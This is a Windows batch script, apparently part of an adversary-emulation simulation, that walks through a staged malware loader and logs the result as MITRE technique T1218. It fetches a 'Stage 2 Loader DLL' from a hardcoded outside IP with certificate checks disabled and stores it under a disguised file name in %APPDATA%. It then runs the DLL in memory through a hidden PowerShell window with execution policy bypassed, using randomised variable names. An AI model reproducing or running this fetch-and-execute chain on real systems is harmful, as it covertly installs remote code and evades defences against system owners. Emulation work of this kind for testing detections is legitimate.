@echo off
setlocal enabledelayedexpansion

REM ============================================================
REM Placeholder constant declarations (random-named SET variables)
REM Each PHR_* literal appears exactly once as a value.
REM ============================================================
SET Xy1z2A3b=%APPDATA%\13962\cfb440fc
SET Cd4Ef5Gh=chr0me.txt
SET Ij6K7lMn=https://3.144.153.50/test/stage/2/icon.png?13962-7
SET Op9Q0rSt=ITZEL-S2B
SET Uv1W2xYz=13962
SET Za3Bc4De=7
SET Fg5H6iJk=%PUBLIC%\\macula-simulations.log
SET Lm7N8oPq=https://3.144.153.50/test

REM Cache timestamp for debug lines
SET tsvar=!DATE!/!TIME!

REM ============================================================
REM Step 1: Heartbeat fetch — download Stage 2 Loader DLL from C2
REM ============================================================
echo [!tsvar!][DEBUG][!Op9Q0rSt!][!Uv1W2xYz!]: heartbeat_start>> "!Fg5H6iJk!" 2>nul
curl -k -s -o "!Xy1z2A3b!\!Cd4Ef5Gh!" "!Ij6K7lMn!"
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!Op9Q0rSt!][!Uv1W2xYz!]: heartbeat_failed=!ERRORLEVEL!>> "!Fg5H6iJk!" 2>nul
    SET heartbeat_ok=0
) ELSE (
    echo [!tsvar!][DEBUG][!Op9Q0rSt!][!Uv1W2xYz!]: heartbeat_complete=0>> "!Fg5H6iJk!" 2>nul
    SET heartbeat_ok=1
)

REM ============================================================
REM Step 2: Position working directory
REM ============================================================
echo [!tsvar!][DEBUG][!Op9Q0rSt!][!Uv1W2xYz!]: chdir_start>> "!Fg5H6iJk!" 2>nul
cd /d "!Xy1z2A3b!" >nul 2>&1
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!Op9Q0rSt!][!Uv1W2xYz!]: chdir_result=!ERRORLEVEL!>> "!Fg5H6iJk!" 2>nul
    SET chdir_ok=0
) ELSE (
    echo [!tsvar!][DEBUG][!Op9Q0rSt!][!Uv1W2xYz!]: chdir_result=0>> "!Fg5H6iJk!" 2>nul
    SET chdir_ok=1
)

REM ============================================================
REM Step 3: Invoke Stage 2 DLL via PowerShell reflection
REM Uses delayed-expansion variables directly inside the PS command.
REM ============================================================
echo [!tsvar!][DEBUG][!Op9Q0rSt!][!Uv1W2xYz!]: dll_load_start>> "!Fg5H6iJk!" 2>nul
powershell.exe -nop -w hidden -ep bypass -Command "& { $a=[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!Xy1z2A3b!\!Cd4Ef5Gh!')); ($a.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null) }"
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!Op9Q0rSt!][!Uv1W2xYz!]: dll_load_result=!ERRORLEVEL!>> "!Fg5H6iJk!" 2>nul
    SET dll_ok=0
) ELSE (
    echo [!tsvar!][DEBUG][!Op9Q0rSt!][!Uv1W2xYz!]: dll_load_result=0>> "!Fg5H6iJk!" 2>nul
    SET dll_ok=1
)

REM ============================================================
REM Step 4: Generate timestamp for TTP logging
REM ============================================================
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM Determine overall result
IF !heartbeat_ok!==1 IF !chdir_ok!==1 IF !dll_ok!==1 (
    SET result=OK
    SET error=
) ELSE (
    SET result=FAIL
    SET error=stage_error
)

REM ============================================================
REM TTP Log — T1218 System Binary Proxy Execution
REM ============================================================
echo [!timestamp!][TTP][!Op9Q0rSt!][!Uv1W2xYz!]: T1218^^|System Binary Proxy Execution=[!result!]:[!error!]>> "!Fg5H6iJk!" 2>&1

endlocal
exit /b 0